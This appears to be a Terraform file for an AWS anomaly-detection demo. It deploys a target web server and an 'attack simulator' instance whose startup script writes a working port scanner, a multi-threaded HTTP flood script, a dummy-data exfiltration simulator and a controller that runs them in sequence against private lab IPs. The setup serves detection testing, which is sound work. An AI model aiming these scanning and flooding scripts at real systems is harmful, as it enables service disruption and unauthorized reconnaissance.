# AMI más reciente de Amazon Linux 2
data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

# User Data para servidor web normal
locals {
  web_server_user_data = base64encode(<<-EOF
    #!/bin/bash

    # Esperar a que la conectividad esté disponible
    sleep 60

    # Verificar conectividad antes de continuar
    until curl -s --max-time 10 https://amazonlinux-2-repos-us-east-1.s3.amazonaws.com > /dev/null; do
      echo "Waiting for internet connectivity..."
      sleep 30
    done

    yum update -y
    yum install -y httpd
    systemctl start httpd
    systemctl enable httpd

    # Crear contenido web simple
    cat > /var/www/html/index.html << 'HTML'
    <html>
      <head><title>Demo Server</title></head>
      <body>
        <h1>Servidor Demo - Detección de Anomalías</h1>
        <p>Este servidor genera tráfico normal para la demo.</p>
        <p>Timestamp: $(date)</p>
      </body>
    </html>
    HTML

    # Script para generar tráfico normal
    cat > /home/ec2-user/generate_normal_traffic.sh << 'SCRIPT'
    #!/bin/bash
    echo "Iniciando generación de tráfico normal..."
    while true; do
        # Simular tráfico HTTP normal
        curl -s http://localhost/ > /dev/null
        sleep $((RANDOM % 10 + 5))

        # Simular algunas consultas DNS
        nslookup google.com > /dev/null
        sleep $((RANDOM % 15 + 10))
    done
    SCRIPT

    chmod +x /home/ec2-user/generate_normal_traffic.sh

    # Ejecutar como servicio
    cat > /etc/systemd/system/normal-traffic.service << 'SERVICE'
[Unit]
Description=Normal Traffic Generator
After=network.target

[Service]
Type=simple
User=ec2-user
ExecStart=/home/ec2-user/generate_normal_traffic.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE

    systemctl daemon-reload
    systemctl enable normal-traffic
    systemctl start normal-traffic
  EOF
  )

  # User Data para simulador de ataques
  attack_simulator_user_data = base64encode(<<-EOF
    #!/bin/bash
    yum update -y
    yum install -y python3 python3-pip nmap

    # Script de Port Scanning
    cat > /home/ec2-user/port_scanner.py << 'PYTHON'
import socket
import threading
import time
import random
import sys

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            print(f"Port {port} is open on {target}")
    except:
        pass

def port_scan_attack(target, duration=300):
    print(f"Iniciando port scan contra {target} por {duration} segundos")
    end_time = time.time() + duration

    while time.time() < end_time:
        port = random.randint(1, 65535)
        threading.Thread(target=scan_port, args=(target, port)).start()
        time.sleep(0.01)  # Para no sobrecargar

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "10.0.1.100"
    port_scan_attack(target)
PYTHON

    # Script de DDoS
    cat > /home/ec2-user/ddos_simulator.py << 'PYTHON'
import threading
import socket
import time
import sys

def ddos_thread(target, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            sock.close()
        except:
            pass
        time.sleep(0.001)

def ddos_attack(target, port=80, threads=100, duration=300):
    print(f"Iniciando DDoS contra {target}:{port} con {threads} threads por {duration} segundos")

    for i in range(threads):
        thread = threading.Thread(target=ddos_thread, args=(target, port, duration))
        thread.daemon = True
        thread.start()

    time.sleep(duration)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "10.0.1.100"
    ddos_attack(target)
PYTHON

    # Script de Data Exfiltration
    cat > /home/ec2-user/data_exfiltration.py << 'PYTHON'
#!/usr/bin/env python3
import socket
import time
import random
import sys

def simulate_data_exfiltration(target, duration=300):
    print(f"Simulando exfiltración de datos hacia {target} por {duration} segundos")
    end_time = time.time() + duration

    # Generar datos aleatorios grandes
    large_data = "X" * (1024 * 1024)  # 1MB de datos

    bytes_sent = 0
    requests_count = 0

    while time.time() < end_time:
        try:
            # CORREGIDO: Usar socket HTTP manual en lugar de requests
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Timeout más largo
            sock.connect((target, 80))

            # Crear HTTP POST request manualmente
            http_request = f"""POST /upload HTTP/1.1\r
Host: {target}\r
Content-Type: application/octet-stream\r
Content-Length: {len(large_data)}\r
Connection: close\r
\r
{large_data}"""

            sock.send(http_request.encode())

            # NUEVO: Intentar leer respuesta (aunque sea error 404)
            try:
                response = sock.recv(1024)
                # print(f"Response: {response[:50]}...")  # Debug
            except:
                pass

            sock.close()

            bytes_sent += len(large_data)
            requests_count += 1

            # Mostrar progreso cada 10 requests
            if requests_count % 10 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                print(f"Enviados: {requests_count} requests, {mb_sent:.1f} MB")

        except ConnectionRefusedError:
            print(f"Conexión rechazada a {target}:80 - continuando...")
        except socket.timeout:
            print("Timeout - continuando...")
        except Exception as e:
            # print(f"Error: {e}")  # Debug
            pass

        # CORREGIDO: Pausa más corta para generar más tráfico
        time.sleep(random.uniform(0.5, 2.0))

    mb_total = bytes_sent / (1024 * 1024)
    print(f"Exfiltración completada: {requests_count} requests, {mb_total:.1f} MB total")

# NUEVO: Función alternativa usando diferentes puertos
def simulate_data_exfiltration_alt_ports(target, duration=300):
    """Versión alternativa usando puertos comunes"""
    print(f"Simulando exfiltración multi-puerto hacia {target} por {duration} segundos")
    end_time = time.time() + duration

    # Puertos donde podría haber servicios
    ports = [80, 443, 22, 21]
    data_chunk = "CONFIDENTIAL_DATA_" + "X" * (1024 * 100)  # 100KB chunks

    bytes_sent = 0
    connections = 0

    while time.time() < end_time:
        port = random.choice(ports)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sock.send(data_chunk.encode())
            sock.close()

            bytes_sent += len(data_chunk)
            connections += 1

            if connections % 20 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                print(f"Conexiones: {connections}, Datos: {mb_sent:.1f} MB")

        except:
            pass

        time.sleep(random.uniform(0.1, 1.0))

    mb_total = bytes_sent / (1024 * 1024)
    print(f"Exfiltración multi-puerto completada: {connections} conexiones, {mb_total:.1f} MB")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "10.0.2.100"
    mode = sys.argv[2] if len(sys.argv) > 2 else "http"

    print("=== DATA EXFILTRATION SIMULATOR ===")
    print(f"Target: {target}")
    print(f"Modo: {mode}")

    if mode == "http":
        simulate_data_exfiltration(target)
    elif mode == "multi":
        simulate_data_exfiltration_alt_ports(target)
    else:
        print("Uso: python3 data_exfiltration.py <target> [http|multi]")
PYTHON

    # Script maestro para controlar ataques
    cat > /home/ec2-user/attack_controller.sh << 'SCRIPT'
#!/bin/bash

TARGET_IP="10.0.2.120"  # IP del servidor web (ajusta según tu setup)

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "$${BLUE}=== Controlador de Ataques para Demo ===$${NC}"
echo -e "$${YELLOW}Target: $TARGET_IP$${NC}"
echo ""
echo "Opciones:"
echo -e "$${RED}1. Port Scan Attack$${NC}     - Escaneo masivo de puertos"
echo -e "$${RED}2. DDoS Attack$${NC}          - Ataque de denegación de servicio"
echo -e "$${RED}3. Data Exfiltration$${NC}    - Exfiltración de datos (HTTP)"
echo -e "$${RED}4. Data Exfiltration Multi$${NC} - Exfiltración multi-puerto"
echo -e "$${RED}5. All Attacks (secuencial)$${NC} - Todos los ataques"
echo -e "$${GREEN}6. Stop all attacks$${NC}     - Detener todos los ataques"
echo -e "$${BLUE}7. Status$${NC}               - Ver estado de ataques"

case $1 in
    1|"port")
        echo -e "$${RED}🔍 Iniciando Port Scan Attack...$${NC}"
        python3 /home/ec2-user/port_scanner.py $TARGET_IP &
        echo $! > /tmp/port_scan.pid
        echo -e "$${GREEN}✅ Port scan iniciado (PID: $(cat /tmp/port_scan.pid))$${NC}"
        echo "💡 Para detener: $0 stop"
        ;;
    2|"ddos")
        echo -e "$${RED}💥 Iniciando DDoS Attack...$${NC}"
        python3 /home/ec2-user/ddos_simulator.py $TARGET_IP &
        echo $! > /tmp/ddos.pid
        echo -e "$${GREEN}✅ DDoS iniciado (PID: $(cat /tmp/ddos.pid))$${NC}"
        echo "💡 Para detener: $0 stop"
        ;;
    3|"exfil")
        echo -e "$${RED}📤 Iniciando Data Exfiltration (HTTP)...$${NC}"
        echo -e "$${YELLOW}Objetivo: Transferir >25MB para activar detección$${NC}"
        python3 /home/ec2-user/data_exfiltration.py $TARGET_IP http &
        echo $! > /tmp/exfil.pid
        echo -e "$${GREEN}✅ Data exfiltration HTTP iniciado (PID: $(cat /tmp/exfil.pid))$${NC}"
        echo "💡 Para detener: $0 stop"
        ;;
    4|"exfil-multi")
        echo -e "$${RED}📤 Iniciando Data Exfiltration (Multi-puerto)...$${NC}"
        echo -e "$${YELLOW}Modo: Múltiples puertos simultáneos$${NC}"
        python3 /home/ec2-user/data_exfiltration.py $TARGET_IP multi &
        echo $! > /tmp/exfil_multi.pid
        echo -e "$${GREEN}✅ Data exfiltration multi-puerto iniciado (PID: $(cat /tmp/exfil_multi.pid))$${NC}"
        echo "💡 Para detener: $0 stop"
        ;;
    5|"all")
        echo -e "$${RED}🔥 Iniciando TODOS los ataques secuencialmente...$${NC}"
        echo -e "$${YELLOW}Duración: 2 minutos cada uno (6 minutos total)$${NC}"
        echo ""

        # Port scan por 2 minutos
        echo -e "$${BLUE}[1/3] Port Scan Attack (2 min)...$${NC}"
        python3 /home/ec2-user/port_scanner.py $TARGET_IP &
        PORT_PID=$!
        echo $PORT_PID > /tmp/port_scan.pid
        sleep 120
        kill $PORT_PID 2>/dev/null
        echo -e "$${GREEN}✅ Port scan completado$${NC}"

        # Pausa entre ataques
        echo -e "$${YELLOW}⏳ Pausa de 30 segundos...$${NC}"
        sleep 30

        # DDoS por 2 minutos
        echo -e "$${BLUE}[2/3] DDoS Attack (2 min)...$${NC}"
        python3 /home/ec2-user/ddos_simulator.py $TARGET_IP &
        DDOS_PID=$!
        echo $DDOS_PID > /tmp/ddos.pid
        sleep 120
        kill $DDOS_PID 2>/dev/null
        echo -e "$${GREEN}✅ DDoS completado$${NC}"

        # Pausa entre ataques
        echo -e "$${YELLOW}⏳ Pausa de 30 segundos...$${NC}"
        sleep 30

        # Data exfiltration por 3 minutos (más tiempo para generar volumen)
        echo -e "$${BLUE}[3/3] Data Exfiltration (3 min)...$${NC}"
        python3 /home/ec2-user/data_exfiltration.py $TARGET_IP http &
        EXFIL_PID=$!
        echo $EXFIL_PID > /tmp/exfil.pid
        sleep 180  # 3 minutos para garantizar >100MB
        kill $EXFIL_PID 2>/dev/null
        echo -e "$${GREEN}✅ Data exfiltration completado$${NC}"

        echo ""
        echo -e "$${GREEN}🎉 Secuencia de ataques completada!$${NC}"
        echo -e "$${YELLOW}💡 Tip: Espera 5-10 minutos para que Lambda detecte las anomalías$${NC}"
        ;;
    6|"stop")
        echo -e "$${YELLOW}🛑 Deteniendo todos los ataques...$${NC}"

        # Matar procesos específicos
        if [ -f /tmp/port_scan.pid ]; then
            PID=$(cat /tmp/port_scan.pid)
            kill $PID 2>/dev/null && echo -e "$${GREEN}✅ Port scan detenido (PID: $PID)$${NC}"
        fi

        if [ -f /tmp/ddos.pid ]; then
            PID=$(cat /tmp/ddos.pid)
            kill $PID 2>/dev/null && echo -e "$${GREEN}✅ DDoS detenido (PID: $PID)$${NC}"
        fi

        if [ -f /tmp/exfil.pid ]; then
            PID=$(cat /tmp/exfil.pid)
            kill $PID 2>/dev/null && echo -e "$${GREEN}✅ Data exfiltration detenido (PID: $PID)$${NC}"
        fi

        if [ -f /tmp/exfil_multi.pid ]; then
            PID=$(cat /tmp/exfil_multi.pid)
            kill $PID 2>/dev/null && echo -e "$${GREEN}✅ Data exfiltration multi detenido (PID: $PID)$${NC}"
        fi

        # Cleanup general por si algo se escapó
        pkill -f "port_scanner.py" 2>/dev/null
        pkill -f "ddos_simulator.py" 2>/dev/null
        pkill -f "data_exfiltration.py" 2>/dev/null

        # Limpiar archivos PID
        rm -f /tmp/*.pid

        echo -e "$${GREEN}✅ Todos los ataques detenidos$${NC}"
        ;;
    7|"status")
        echo -e "$${BLUE}📊 Estado de Ataques Activos:$${NC}"
        echo ""

        # Verificar port scan
        if [ -f /tmp/port_scan.pid ] && kill -0 $(cat /tmp/port_scan.pid) 2>/dev/null; then
            echo -e "$${RED}🔍 Port Scan: ACTIVO (PID: $(cat /tmp/port_scan.pid))$${NC}"
        else
            echo -e "$${GREEN}🔍 Port Scan: INACTIVO$${NC}"
        fi

        # Verificar DDoS
        if [ -f /tmp/ddos.pid ] && kill -0 $(cat /tmp/ddos.pid) 2>/dev/null; then
            echo -e "$${RED}💥 DDoS: ACTIVO (PID: $(cat /tmp/ddos.pid))$${NC}"
        else
            echo -e "$${GREEN}💥 DDoS: INACTIVO$${NC}"
        fi

        # Verificar data exfiltration
        if [ -f /tmp/exfil.pid ] && kill -0 $(cat /tmp/exfil.pid) 2>/dev/null; then
            echo -e "$${RED}📤 Data Exfiltration: ACTIVO (PID: $(cat /tmp/exfil.pid))$${NC}"
        else
            echo -e "$${GREEN}📤 Data Exfiltration: INACTIVO$${NC}"
        fi

        # Verificar data exfiltration multi
        if [ -f /tmp/exfil_multi.pid ] && kill -0 $(cat /tmp/exfil_multi.pid) 2>/dev/null; then
            echo -e "$${RED}📤 Data Exfiltration Multi: ACTIVO (PID: $(cat /tmp/exfil_multi.pid))$${NC}"
        else
            echo -e "$${GREEN}📤 Data Exfiltration Multi: INACTIVO$${NC}"
        fi

        echo ""
        echo -e "$${YELLOW}💡 Procesos Python activos:$${NC}"
        ps aux | grep -E "(port_scanner|ddos_simulator|data_exfiltration)" | grep -v grep || echo "Ninguno"
        ;;
    "demo")
        echo -e "$${BLUE}🎬 MODO DEMO - Secuencia optimizada para presentación$${NC}"
        echo -e "$${YELLOW}Duración total: ~8 minutos$${NC}"
        echo ""

        echo -e "$${BLUE}[Demo 1/3] Port Scan (90 segundos)$${NC}"
        python3 /home/ec2-user/port_scanner.py $TARGET_IP &
        PORT_PID=$!
        sleep 90
        kill $PORT_PID 2>/dev/null
        echo -e "$${GREEN}✅ Demo port scan completado$${NC}"

        echo -e "$${YELLOW}⏳ Pausa para explicación (60 segundos)$${NC}"
        sleep 60

        echo -e "$${BLUE}[Demo 2/3] DDoS (90 segundos)$${NC}"
        python3 /home/ec2-user/ddos_simulator.py $TARGET_IP &
        DDOS_PID=$!
        sleep 90
        kill $DDOS_PID 2>/dev/null
        echo -e "$${GREEN}✅ Demo DDoS completado$${NC}"

        echo -e "$${YELLOW}⏳ Pausa para explicación (60 segundos)$${NC}"
        sleep 60

        echo -e "$${BLUE}[Demo 3/3] Data Exfiltration (180 segundos)$${NC}"
        python3 /home/ec2-user/data_exfiltration.py $TARGET_IP http &
        EXFIL_PID=$!
        sleep 180
        kill $EXFIL_PID 2>/dev/null
        echo -e "$${GREEN}✅ Demo data exfiltration completado$${NC}"

        echo ""
        echo -e "$${GREEN}🎉 Demo completado!$${NC}"
        echo -e "$${YELLOW}📱 Revisa tu email en 5-10 minutos para las alertas$${NC}"
        ;;
    *)
        echo -e "$${RED}❌ Opción no válida$${NC}"
        echo ""
        echo -e "$${YELLOW}Uso:$${NC}"
        echo "  $0 [1|2|3|4|5|6|7] o [port|ddos|exfil|exfil-multi|all|stop|status|demo]"
        echo ""
        echo -e "$${YELLOW}Ejemplos:$${NC}"
        echo "  $0 port           # Port scan attack"
        echo "  $0 exfil          # Data exfiltration HTTP"
        echo "  $0 all            # Todos los ataques"
        echo "  $0 demo           # Secuencia para demo"
        echo "  $0 stop           # Detener todo"
        echo "  $0 status         # Ver estado"
        exit 1
        ;;
esac

# Mostrar información adicional si no es stop o status
if [[ ! "$1" =~ ^(6|stop|7|status)$ ]]; then
    echo ""
    echo -e "$${YELLOW}📋 Información útil:$${NC}"
    echo "  • Target IP: $TARGET_IP"
    echo "  • Ver estado: $0 status"
    echo "  • Detener todo: $0 stop"
    echo "  • Logs en tiempo real: tail -f /var/log/messages"
    echo ""
    echo -e "$${BLUE}🔍 Para monitorear tráfico:$${NC}"
    echo "  • sudo netstat -tulpn | grep python"
    echo "  • ss -tuln | grep python"
fi
SCRIPT

    chmod +x /home/ec2-user/attack_controller.sh
    chown ec2-user:ec2-user /home/ec2-user/*.py
    chown ec2-user:ec2-user /home/ec2-user/*.sh
  EOF
  )
}

# Instancia del servidor web (target)
resource "aws_instance" "web_server" {
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = var.instance_type
  iam_instance_profile   = aws_iam_instance_profile.ec2_profile.name
  key_name               = var.key_pair_name
  vpc_security_group_ids = [aws_security_group.web_server.id]
  subnet_id              = aws_subnet.private.id

  user_data_base64 = local.web_server_user_data

  tags = merge(local.common_tags, {
    Name    = "demo-aws-web-server"
    Role    = "Target"
    Purpose = "NormalTrafficGenerator"
  })

  depends_on = [
    aws_nat_gateway.main,
    aws_route_table.private
  ]

}

# Instancia del simulador de ataques
resource "aws_instance" "attack_simulator" {
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = var.instance_type
  iam_instance_profile   = aws_iam_instance_profile.ec2_profile.name
  key_name               = var.key_pair_name
  vpc_security_group_ids = [aws_security_group.attack_simulator.id]
  subnet_id              = aws_subnet.public.id

  user_data_base64 = local.attack_simulator_user_data

  tags = merge(local.common_tags, {
    Name    = "demo-aws-attack-simulator"
    Role    = "Attacker"
    Purpose = "AttackSimulator"
  })
}

# Security Group para servidor web
resource "aws_security_group" "web_server" {
  name_prefix = "demo-aws-web-server-"
  description = "Security Group para servidor web"
  vpc_id      = aws_vpc.main.id

  ingress {
    description = "HTTP"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  ingress {
    description = "HTTPS"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  ingress {
    description = "SSH from VPC"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = merge(local.common_tags, {
    Name = "demo-aws-web-server-sg"
  })
}

# Security Group para simulador de ataques
resource "aws_security_group" "attack_simulator" {
  name_prefix = "demo-aws-attack-simulator-"
  description = "Security Group para simulador de ataques"
  vpc_id      = aws_vpc.main.id

  ingress {
    description = "SSH"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = merge(local.common_tags, {
    Name = "demo-aws-attack-simulator-sg"
  })
}

# Elastic IP para el simulador de ataques (para acceso SSH)
resource "aws_eip" "attack_simulator" {
  instance = aws_instance.attack_simulator.id
  domain   = "vpc"

  tags = merge(local.common_tags, {
    Name = "demo-aws-attack-simulator-eip"
  })
}
